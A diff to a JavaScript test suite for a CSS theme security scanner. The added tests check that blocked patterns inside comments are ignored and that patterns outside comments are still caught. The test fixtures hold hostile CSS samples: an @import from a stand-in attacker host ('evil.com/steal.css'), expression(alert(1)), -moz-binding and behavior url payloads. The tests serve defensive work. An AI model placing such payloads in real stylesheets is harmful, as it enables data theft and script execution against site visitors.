@@ -106,6 +106,27 @@ describe('security scanner', () => {
     expect(output).toContain('data leaking');
   });
 
+  it('ignores attack patterns inside CSS comments', () => {
+    const { exitCode } = scanTheme(
+      makeSkin('/* @import url("https://evil.com/steal.css"); */\n.safe { color: red; }'),
+    );
+    expect(exitCode).toBe(0);
+  });
+
+  it('ignores multi-line CSS comments containing blocked patterns', () => {
+    const { exitCode } = scanTheme(
+      makeSkin(
+        '/*\n  expression(alert(1))\n  -moz-binding: url("xbl")\n  behavior: url(x.htc)\n*/\n.ok { display: block; }',
+      ),
+    );
+    expect(exitCode).toBe(0);
+  });
+
+  it('still blocks patterns outside comments', () => {
+    const { exitCode } = scanTheme(makeSkin('/* safe comment */ @import url("https://evil.com");'));
+    expect(exitCode).toBe(1);
+  });
+
   it('scans component css blocks too', () => {
     const skin = `meta:
   name: test
